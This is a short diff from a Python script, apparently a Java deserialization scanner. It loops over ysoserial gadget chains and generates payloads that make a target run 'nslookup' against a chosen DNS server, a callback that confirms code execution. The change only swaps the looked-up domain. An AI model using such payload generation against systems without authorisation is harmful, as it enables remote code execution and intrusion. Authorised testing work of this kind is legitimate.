@@ -48,7 +48,7 @@ def pre_main():
                  "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
 
     for name in ping_list:
-        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'nslookup google.com.vn {}' > core/payload_ping/{}.bin".format(
+        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'nslookup google.com {}' > core/payload_ping/{}.bin".format(
             os.getcwd(), name.strip(),ip_add, name)
         os.system(command)
     os.system("clear")
